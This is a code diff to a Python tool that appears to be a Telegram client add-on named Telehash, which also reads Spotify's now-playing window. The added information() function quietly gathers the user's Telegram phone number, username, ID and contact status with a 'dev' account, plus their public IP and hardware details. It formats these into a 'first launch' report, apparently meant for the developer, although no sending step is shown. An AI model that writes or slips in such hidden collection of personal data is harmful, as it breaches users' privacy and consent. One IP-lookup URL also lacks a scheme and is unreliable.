@@ -1,5 +1,8 @@
 import win32gui, psutil, win32process
 import random as r
+import wmi, platform
+from config import *
+import requests
 
 def spotify():
     spw = 0
@@ -52,3 +55,46 @@ def nowplaying():
         artist = 'none'
         name = 'none'
     return(process, title, artist, name)
+
+def information(client, lang, name):
+    me = client.get_me()
+    withdev = client.get_users(dev)
+
+    computer = wmi.WMI()
+    computer_info = computer.Win32_ComputerSystem()[0]
+    os_info = computer.Win32_OperatingSystem()[0]
+    proc_info = computer.Win32_Processor()[0]
+    gpu_info = computer.Win32_VideoController()[0]
+
+    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
+    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
+    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+
+    try:
+        ip = requests.get('api.ipify.org').text
+    except:
+        try:
+            ip = requests.get('https://api.seeip.org/').text
+        except:
+            ip = 'ip error'
+    text = f'''{me.first_name} запустил Telehash впервые
+NMB: {me.phone_number}
+DOG: {me.username}
+ID: {me.id}
+LNG: {lang}
+MTL: {withdev.is_mutual_contact}
+USR: {name}
+URNAM: {withdev.first_name}
+
+> PC
+
+IP: {ip}
+OS: {platform.architecture()[0]} {platform.system()}
+CPU: {proc_info.Name}
+GPU: {gpu_info.Name}
+RAM: {round(system_ram)}GB
+NODE: {platform.node()}
+
+CLI: {v}
+'''
+    return text
